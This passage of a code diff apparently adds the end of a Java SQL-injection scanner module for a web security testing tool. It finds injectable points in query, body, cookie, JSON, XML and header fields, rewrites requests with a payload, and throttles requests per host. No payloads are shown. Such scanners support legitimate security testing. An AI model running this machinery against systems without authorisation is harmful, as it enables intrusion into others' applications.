+                    String jsonPattern = "\"" + Pattern.quote(ip.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
+                    String replacement = "\"" + ip.name + "\": \"" + escaped + "\"";
+                    String newBody = body.replaceFirst(jsonPattern, replacement);
+                    return request.withBody(newBody);
+                }
+            case XML:
+                String xmlBody = request.bodyToString();
+                String xmlEscaped = payload.replace("&", "&amp;").replace("<", "&lt;")
+                        .replace(">", "&gt;").replace("\"", "&quot;");
+                String newXml;
+                if (ip.name.startsWith("@")) {
+                    // Attribute injection — replace attribute value
+                    String attrName = ip.name.substring(1);
+                    newXml = xmlBody.replaceFirst(
+                            Pattern.quote(attrName) + "\\s*=\\s*\"" + Pattern.quote(ip.originalValue) + "\"",
+                            attrName + "=\"" + xmlEscaped + "\"");
+                } else {
+                    // Element text injection — replace text between tags
+                    newXml = xmlBody.replaceFirst(
+                            "(<" + Pattern.quote(ip.name) + "(?:\\s[^>]*)?>)" + Pattern.quote(ip.originalValue)
+                                    + "(</" + Pattern.quote(ip.name) + ">)",
+                            "$1" + Matcher.quoteReplacement(xmlEscaped) + "$2");
+                }
+                return request.withBody(newXml);
+            case HEADER:
+                return request.withRemovedHeader(ip.name).withAddedHeader(ip.name, payload);
+            default:
+                return request;
+        }
+    }
+
+    /**
+     * Replace a value at a dot-notation path in a JSON string.
+     * E.g., path "user.profile.name" replaces the value at obj.user.profile.name.
+     */
+    private String replaceNestedJsonValue(String jsonBody, String dotPath, String escapedValue) {
+        try {
+            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(jsonBody);
+            if (!root.isJsonObject()) return jsonBody;
+
+            String[] parts = dotPath.split("\\.");
+            com.google.gson.JsonObject current = root.getAsJsonObject();
+
+            // Traverse to the parent of the target key
+            for (int i = 0; i < parts.length - 1; i++) {
+                com.google.gson.JsonElement child = current.get(parts[i]);
+                if (child == null || !child.isJsonObject()) return jsonBody;
+                current = child.getAsJsonObject();
+            }
+
+            // Replace the leaf value
+            String leafKey = parts[parts.length - 1];
+            if (current.has(leafKey)) {
+                current.addProperty(leafKey, escapedValue);
+            }
+
+            return new com.google.gson.Gson().toJson(root);
+        } catch (Exception e) {
+            return jsonBody;
+        }
+    }
+
+    private List<InjectionPoint> extractInjectionPoints(HttpRequest request) {
+        List<InjectionPoint> points = new ArrayList<>();
+
+        for (var param : request.parameters()) {
+            switch (param.type()) {
+                case URL:
+                    points.add(new InjectionPoint(param.name(), param.value(), InjectionType.QUERY));
+                    break;
+                case BODY:
+                    points.add(new InjectionPoint(param.name(), param.value(), InjectionType.BODY));
+                    break;
+                case COOKIE:
+                    points.add(new InjectionPoint(param.name(), param.value(), InjectionType.COOKIE));
+                    break;
+            }
+        }
+
+        // JSON body parameters
+        String contentType = "";
+        for (var h : request.headers()) {
+            if (h.name().equalsIgnoreCase("Content-Type")) {
+                contentType = h.value();
+                break;
+            }
+        }
+        if (contentType.contains("application/json")) {
+            try {
+                String body = request.bodyToString();
+                if (body != null && !body.isBlank()) {
+                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
+                    if (el.isJsonObject()) {
+                        extractJsonParams(el.getAsJsonObject(), "", points);
+                    }
+                }
+            } catch (Exception ignored) {
+            }
+        }
+
+        // XML body parameters
+        if (contentType.contains("/xml") || contentType.contains("+xml")) {
+            try {
+                String body = request.bodyToString();
+                if (body != null && !body.isBlank() && body.trim().startsWith("<")) {
+                    extractXmlParams(body, points);
+                }
+            } catch (Exception ignored) {}
+        }
+
+        // Extract injectable request headers
+        String[] headerTargets = {"User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host", "Origin"};
+        for (String headerName : headerTargets) {
+            for (var h : request.headers()) {
+                if (h.name().equalsIgnoreCase(headerName)) {
+                    points.add(new InjectionPoint(h.name(), h.value(), InjectionType.HEADER));
+                    break;
+                }
+            }
+        }
+
+        return points;
+    }
+
+    // XML extraction patterns
+    private static final Pattern XML_ELEMENT_PATTERN =
+            Pattern.compile("<([a-zA-Z][a-zA-Z0-9_:.-]*)(?:\\s[^>]*)?>([^<]+)</\\1>");
+    private static final Pattern XML_ATTR_PATTERN =
+            Pattern.compile("([a-zA-Z][a-zA-Z0-9_:.-]*)\\s*=\\s*\"([^\"]*)\"");
+
+    private void extractXmlParams(String xmlBody, List<InjectionPoint> points) {
+        Set<String> seen = new HashSet<>();
+
+        // Extract text content of elements: <tagName>value</tagName>
+        Matcher m = XML_ELEMENT_PATTERN.matcher(xmlBody);
+        while (m.find()) {
+            String name = m.group(1);
+            String value = m.group(2).trim();
+            if (!value.isEmpty() && !seen.contains("elem:" + name)) {
+                seen.add("elem:" + name);
+                points.add(new InjectionPoint(name, value, InjectionType.XML));
+            }
+        }
+
+        // Extract attribute values (skip xmlns and standard XML attrs)
+        Matcher am = XML_ATTR_PATTERN.matcher(xmlBody);
+        while (am.find()) {
+            String attrName = am.group(1);
+            String attrValue = am.group(2).trim();
+            if (!attrValue.isEmpty() && !attrName.startsWith("xmlns")
+                    && !attrName.equals("encoding") && !attrName.equals("version")
+                    && !seen.contains("attr:" + attrName)) {
+                seen.add("attr:" + attrName);
+                points.add(new InjectionPoint("@" + attrName, attrValue, InjectionType.XML));
+            }
+        }
+    }
+
+    private void extractJsonParams(com.google.gson.JsonObject obj, String prefix, List<InjectionPoint> points) {
+        for (String key : obj.keySet()) {
+            com.google.gson.JsonElement val = obj.get(key);
+            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
+            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
+                points.add(new InjectionPoint(fullKey, val.getAsString(), InjectionType.JSON));
+            } else if (val.isJsonObject()) {
+                extractJsonParams(val.getAsJsonObject(), fullKey, points);
+            }
+        }
+    }
+
+    private String extractPath(String url) {
+        try {
+            if (url.contains("://")) {
+                url = url.substring(url.indexOf("://") + 3);
+            }
+            int slashIdx = url.indexOf('/');
+            if (slashIdx >= 0) {
+                int queryIdx = url.indexOf('?', slashIdx);
+                return queryIdx >= 0 ? url.substring(slashIdx, queryIdx) : url.substring(slashIdx);
+            }
+        } catch (Exception ignored) {
+        }
+        return url;
+    }
+
+    private void perHostDelay() throws InterruptedException {
+        int delay = config.getInt("sqli.perHostDelay", 500);
+        if (delay > 0) Thread.sleep(delay);
+    }
+
+    @Override
+    public void destroy() {
+        tested.clear();
+    }
+
+    // Inner types
+    private enum InjectionType { QUERY, BODY, COOKIE, JSON, HEADER, XML }
+
+    private static class InjectionPoint {
+        final String name;
+        final String originalValue;
+        final InjectionType type;
+
+        InjectionPoint(String name, String originalValue, InjectionType type) {
+            this.name = name;
+            this.originalValue = originalValue != null ? originalValue : "";
+            this.type = type;
+        }
+    }
+
+    public ConcurrentHashMap<String, Boolean> getTested() { return tested; }
+}
